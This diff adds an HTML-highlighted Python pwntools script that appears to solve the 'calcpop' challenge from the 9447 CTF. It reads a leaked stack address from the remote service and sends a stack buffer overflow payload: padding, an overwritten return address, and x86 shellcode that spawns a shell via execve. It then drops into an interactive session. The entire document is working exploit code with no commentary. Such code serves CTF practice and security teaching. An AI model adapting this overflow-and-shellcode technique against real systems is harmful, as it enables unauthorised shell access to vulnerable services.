@@ -1,0 +1,21 @@
+<div class="highlight"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c">#p = process(&#39;./calcpop&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">&#39;calcpop-4gh07blg.9447.plumbing&#39;</span><span class="p">,</span> <span class="mi">9447</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;was&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&#39;0x&#39;</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
+<span class="n">eip</span> <span class="o">=</span> <span class="n">stack</span> <span class="o">+</span> <span class="mh">0xa0</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
+
+<span class="n">payload</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x98</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x4</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">eip</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;201526 1&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
